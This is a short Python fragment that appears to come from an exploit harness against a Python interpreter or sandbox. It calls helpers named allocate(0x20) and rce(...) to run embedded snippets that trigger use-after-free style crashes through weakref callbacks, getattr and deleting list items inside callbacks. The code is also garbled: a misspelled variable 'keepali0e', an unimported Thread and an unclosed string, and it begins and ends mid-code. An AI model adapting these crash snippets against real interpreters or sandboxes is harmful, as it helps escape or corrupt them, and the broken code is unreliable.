import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepalive.append(a)
a=A()
a.x=lst
keepalive.append(a)
a=A()
a.f=callback
keepalive.append(a)
 
Thread(target=callback,args=(lst,)).start()
""")
 
 #crash on weakref.ref
allocate(0x20)
allocate(0x20)
rce("""
import weakref
class A(object):pass
def callback(a):del keepalive[0]
keepalive=[]
a=A()
a.c=a
keepalive.append(a)
a=A()
a.x=callback
keepalive.append(a)
 
callback(a)
""")
 
#crash on getattr
allocate(0x20)
allocate(0x20)
rce("""
import sys
def callback():del keepalive[0]
keepalive=[sys.path]
a=object.__getattribute__
a(callback,"__init__")
""
